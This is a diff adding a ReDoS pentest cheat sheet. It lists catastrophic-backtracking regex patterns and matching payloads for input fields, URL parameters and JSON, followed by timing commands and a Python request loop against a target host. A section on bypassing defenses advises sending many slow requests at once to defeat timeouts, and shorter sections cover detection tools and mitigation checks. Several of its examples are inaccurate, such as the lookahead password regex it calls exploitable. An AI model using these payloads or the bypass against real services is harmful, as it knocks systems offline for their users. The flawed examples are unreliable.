@@ -1,0 +1,247 @@
+# Regular Expression Denial of Service (ReDoS)
+
+## ========================================
+## EVIL REGEX PATTERNS
+## ========================================
+
+# Nested quantifiers
+^(a+)+$
+^(a*)*$
+^(a|a)*$
+^(a|ab)*$
+
+# Alternation with overlap
+^(a|a)*b$
+^(a|ab)*c$
+
+# Grouping with quantifiers
+^([a-zA-Z]+)*$
+^(.*a){x}$
+
+## ========================================
+## COMMON VULNERABLE PATTERNS
+## ========================================
+
+# Email validation (vulnerable)
+^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$
+
+# URL validation (vulnerable)
+^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$
+
+# Date validation (vulnerable)
+^([0-9]+)*-([0-9]+)*-([0-9]+)*$
+
+## ========================================
+## TEST PAYLOADS
+## ========================================
+
+# For pattern: (a+)+b
+aaaaaaaaaaaaaaaaaaaaaaaaa!
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# For pattern: (a|a)*b
+aaaaaaaaaaaaaaaaaaa!
+aaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# For pattern: (.*a){10}
+aaaaaaaaaa!
+aaaaaaaaaaaaaaaaaa!
+
+## ========================================
+## ATTACK VECTORS
+## ========================================
+
+# Input fields
+username=aaaaaaaaaaaaaaaaaaaaaa!
+email=aaaaaaaaaaaaaaaaaaaaaa@test.com
+search=aaaaaaaaaaaaaaaaaaaaaa
+
+# URL parameters
+?q=aaaaaaaaaaaaaaaaaaaaaa!
+?pattern=aaaaaaaaaaaaaaaa!
+
+# JSON payloads
+{"search": "aaaaaaaaaaaaaaaaaaa!"}
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Identify regex validation
+# Look for pattern matching in:
+- Input validation
+- Search functions
+- URL routing
+- File name validation
+
+# 2. Craft payload
+# Based on regex pattern
+# Add repetition that causes backtracking
+
+# 3. Measure response time
+time curl "http://target.com/search?q=aaaaaa...!"
+
+# 4. Increase payload length
+# Observe exponential increase in time
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Email validation
+Pattern: ^([a-zA-Z0-9])(([\\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}...
+Payload: aaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# Example 2: Password validation
+Pattern: ^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$
+Payload: Aaaaaaaaaaaaaaaaaaaaaaa!
+
+# Example 3: URL validation
+Pattern: ^(https?:\\/\\/)?([\\da-z\\.-]+)\\.([a-z\\.]{2,6})([/\\w \\.-]*)*\\/?$
+Payload: http://aaaaaaaaaaaaaaaaaaaaa
+
+## ========================================
+## LANGUAGE-SPECIFIC PATTERNS
+## ========================================
+
+# JavaScript
+/^(a+)+$/
+/^(a*)*$/
+/^([a-z]+)*$/
+
+# Python
+re.compile(r'^(a+)+$')
+re.compile(r'^(a*)*$')
+
+# PHP
+preg_match('/^(a+)+$/', $input)
+
+# Java
+Pattern.compile("^(a+)+$")
+
+# Ruby
+/^(a+)+$/
+
+## ========================================
+## DETECTING VULNERABLE REGEX
+## ========================================
+
+# Tools
+- regexploit
+- rxxr2
+- regex-static-analysis
+
+# Manual analysis
+# Look for:
+1. Nested quantifiers: (a+)+
+2. Alternation with overlap: (a|ab)*
+3. Grouping + quantifiers: ([a-z]+)*
+
+## ========================================
+## REAL-WORLD EXAMPLES
+## ========================================
+
+# Stack Overflow (2016)
+Pattern: ^(\\s+|\\S+)*$
+Payload: Long string of spaces followed by !
+
+# npm ms module
+Pattern: /^(\\d+\\.?\\d*) *([a-z]+)$/i
+Payload: "1111111111111111111111111 "
+
+# moment.js
+Pattern for date parsing
+Payload causing exponential backtracking
+
+## ========================================
+## IMPACT ASSESSMENT
+## ========================================
+
+# Measure impact
+import time
+import re
+
+pattern = re.compile(r'^(a+)+$')
+payload = 'a' * 20 + '!'
+
+start = time.time()
+pattern.match(payload)
+end = time.time()
+
+print(f"Time: {end - start} seconds")
+
+## ========================================
+## BYPASSING DEFENSES
+## ========================================
+
+# Timeout defenses
+# Send multiple simultaneous requests
+# Each with payload causing 5-10s delay
+
+# Length limits
+# Craft shorter payload with higher impact
+# (a+)+ with fewer chars but more backtracking
+
+## ========================================
+## AUTOMATED TESTING
+## ========================================
+
+# Python script
+import requests
+import time
+
+payloads = [
+    'a' * 10 + '!',
+    'a' * 15 + '!',
+    'a' * 20 + '!',
+    'a' * 25 + '!',
+]
+
+for payload in payloads:
+    start = time.time()
+    r = requests.get(f'http://target.com/search?q={payload}')
+    elapsed = time.time() - start
+    print(f"Payload length {len(payload)}: {elapsed}s")
+
+## ========================================
+## TOOLS
+## ========================================
+
+# regexploit
+npm install -g regexploit
+regexploit '^(a+)+$'
+
+# safe-regex
+npm install safe-regex
+safe-regex('^(a+)+$')  // Returns false if vulnerable
+
+# regex-static-analysis
+# Online tools for regex analysis
+
+## ========================================
+## DOS SCENARIOS
+## ========================================
+
+# Scenario 1: Login form
+# Email regex is vulnerable
+# Submit: aaaaaaaaaaaaaa@test.com
+
+# Scenario 2: Search function
+# Pattern matching causes CPU spike
+# Query: aaaaaaaaaaaaaaaa!
+
+# Scenario 3: File upload
+# Filename validation vulnerable
+# Upload: aaaaaaaaaaaaa.txt
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Verify:
+- Regex timeout implemented
+- Safe regex patterns used
+- Input length limits
+- No nested quantifiers
+- Regex complexity analyzed
+- Alternative validation methods
